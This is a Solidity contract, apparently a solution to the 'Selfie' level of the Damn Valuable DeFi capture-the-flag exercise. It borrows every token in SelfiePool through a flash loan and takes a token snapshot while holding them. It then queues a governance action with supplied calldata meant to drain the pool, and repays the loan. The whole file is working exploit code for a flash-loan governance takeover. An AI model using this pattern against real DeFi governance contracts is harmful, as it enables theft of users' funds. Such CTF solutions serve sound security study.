// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SimpleGovernance.sol";
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public governance;
    address public owner;
    bytes public attackData;
    uint256 public fundsInPool;
    uint256 public maliciousAction;

    constructor(address tokenAddress, address poolAddress, address governanceAddress) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        owner = msg.sender;
        fundsInPool = token.balanceOf(poolAddress);
    }

    function setAttackData(bytes calldata data) public {
        attackData = data;
    }

    function takeLoan() public {
        // execute a flash loan borrowing all available DVT tokens in the pool
        pool.flashLoan(fundsInPool);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        // take a snapshot of all balances before returning the tokens
        token.snapshot();

        // queue governance action draining the funds
        maliciousAction = governance.queueAction(address(pool), attackData, 0);

        // return the funds back to the pool
        token.transfer(address(pool), amount);
    }
}
